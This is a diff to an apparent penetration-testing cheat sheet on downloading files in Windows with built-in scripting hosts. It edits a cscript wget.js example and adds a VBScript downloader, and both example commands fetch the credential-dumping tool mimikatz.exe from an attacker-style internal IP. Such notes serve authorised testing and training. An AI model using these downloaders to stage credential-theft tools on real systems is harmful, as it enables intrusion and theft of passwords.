@@ -189,7 +189,7 @@ https://github.com/api0cradle/LOLBAS/blob/master/LOLBins.md
 
 ## cscript wget.js
 
-> cscript /nologo wget.js https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1
+> cscript /nologo wget.js http://10.10.10.10/mimikatz.exe
 
 ```
 var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
@@ -209,6 +209,33 @@ BinStream.SaveToFile("out.bin");
 Links:
 
 https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl
+
+## cscript wget.vbs
+
+cscript wget.vbs http://10.10.10.10/mimikatz.exe mimikatz.exe
+
+```
+Set args = WScript.Arguments
+
+Url = args.Item(0)
+File = args.Item(1)
+
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", Url, False
+xHttp.Send
+ 
+with bStrm
+    .type = 1 '//binary
+    .open
+    .write xHttp.responseBody
+    .savetofile File, 2 '//overwrite
+end with
+```
+
+Links:
+
+https://staheri.com/my-blog/2013/january/vbscript-download-file-from-url/
 
 ## curl
 
